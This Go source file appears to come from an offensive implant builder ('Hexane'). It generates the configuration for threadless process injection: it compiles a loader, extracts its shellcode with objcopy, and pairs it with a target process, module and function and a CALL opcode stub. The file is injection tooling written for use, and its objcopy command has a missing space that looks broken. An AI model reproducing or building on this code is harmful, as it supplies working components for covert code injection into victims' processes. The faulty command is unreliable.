package core

import (
	"os"
)

func (h *HexaneConfig) GetInjectConfig() ([]string, error) {
	var (
		err     error
		bLoader []byte
	)

	opcode := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
	execute := h.UserConfig.Builder.Loader.Config.(*Threadless).Execute
	loader := h.UserConfig.Builder.Loader.Config.(*Threadless).LoaderAsm

	WrapMessage("DBG", "generating execute object "+execute)
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", execute+".o", []string{execute}, h.Compiler.Flags, []string{RootDirectory}, nil); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "generating Threadless loader object")
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", loader+".o", []string{loader}, nil, []string{RootDirectory}, nil); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "extracting .text from loader object")
	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + loader + ".o" + "loader_shc.bin"); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "extracting loader shellcode")
	if bLoader, err = os.ReadFile("loader_shc.bin"); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "allocating injection strings config")
	return []string{
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetProc,
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetModule,
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetFunc,
		string(opcode),
		string(bLoader),
	}, nil
}
